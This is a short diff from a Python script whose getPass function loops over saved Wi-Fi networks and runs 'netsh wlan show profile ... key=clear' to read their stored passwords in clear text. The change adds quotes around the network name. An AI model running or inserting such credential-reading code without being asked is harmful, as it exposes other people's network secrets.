@@ -32,7 +32,7 @@ def getPass():
 
     for network in getWifi():
         #print(network)
-        cmd = 'netsh wlan show profile ' + network + ' key=clear'
+        cmd = 'netsh wlan show profile "' + network + '" key=clear'
         wlanProfile = subprocess.check_output(cmd)
         wlanProfile = wlanProfile.decode()
         if 'Key Content' in wlanProfile:
